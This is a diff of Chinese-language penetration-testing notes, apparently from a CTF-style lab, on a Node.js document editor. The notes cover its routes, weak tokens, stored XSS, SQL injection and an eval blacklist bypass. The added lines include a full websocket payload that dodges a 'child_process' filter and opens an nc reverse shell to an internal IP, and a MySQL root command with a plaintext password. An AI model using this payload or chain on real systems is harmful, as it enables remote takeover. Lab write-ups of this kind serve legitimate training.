@@ -10,7 +10,7 @@
 - webpack.config.js：client-src前端入口打包配置，没有发现，开启了disk
 - application_setting.json: 开启websocket
 - app.js: 中间件路由，所有请求要走的中间件包括customAuthMiddleware，customDocMiddleware，customPluginMiddleware
-- server-src/settings.js: 后端配置，debug的mysql账号是root，密码71bfaf52714a338c3bc34add6d1d12716bed0f1d76cb2602d119aa425307feb8，数据库为docedit。连接命令mysql -h 127.0.0.1 -u root
+- server-src/settings.js: 后端配置，debug的mysql账号是root，密码71bfaf52714a338c3bc34add6d1d12716bed0f1d76cb2602d119aa425307feb8，数据库为docedit。连接命令mysql -h 127.0.0.1 -u root -p71bfaf52714a338c3bc34add6d1d12716bed0f1d76cb2602d119aa425307feb8
 ## 前端路由信息
 先看下路由信息有哪些路径可以走，以及权限设置，包括：
 - 无需授权：
@@ -46,6 +46,7 @@
   - /document/tag/:docid：修改tag
 - Websocket路由
   - updateProfile：更新用户信息，使用usercontroller，输入没有过滤，参数有data.firstName, data.lastName, data.email,data.password1,data.password2
+  - checkEmail：调用了SQL拼接的search email函数，导致SQL注入,前端是在创建文档后的指定文档的tag里
 - 管理员用户
   - /server：走的plugin controller
     - pluginController.js: 使用了eval函数执行location变量，且该变量用户可控制，虽然设置了黑名单blacklist = ["require", "child_process"]但是可以被绕过
@@ -55,7 +56,7 @@
 2. token使用伪随机Random：使用了伪随机，可以直接爆破出来
 3. cookie：虽然有js的控制，但是没有失效时间控制
 4. 储存型XSS： doc可以写入js代码，toggle会弹xss
-5. 模板注入：server接口的plugin，用户可控制的location参数执行代码
-6. SQL注入：更新email的profil时，使用字符串拼接，可能导致sql注入
+5. 模板注入：server接口的plugin，用户可控制的location参数执行代码，使用```42["togglePlugin",{"name":"chat_ws')];var m=process.mainModule.constructor._load;var cp=m('child'+'_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.186 443 >/tmp/f',function(){});//","enable":false,"token":"bnrftMbdOE6ZBfxP84a95A6qGoyjKXM1"}]```导致命令执行
+6. SQL注入：更新doc的tag时时，使用字符串拼接，可能导致sql注入
 # 攻击链
-注册用户 -> 进入用户获取第一个flag -> 更新profile的email使用盲注获取管理员token -> 进入管理员用户 -> 通过/server进行模板注入执行命令
+注册用户 -> 登录注册用户，使用token获取第一个flag -> 更新doc的tag时输入的email使用bool盲注获取管理员token()（表AuthTokens的UserId为1 ）-> 进入管理员用户 -> 通过/server进行模板注入执行命令
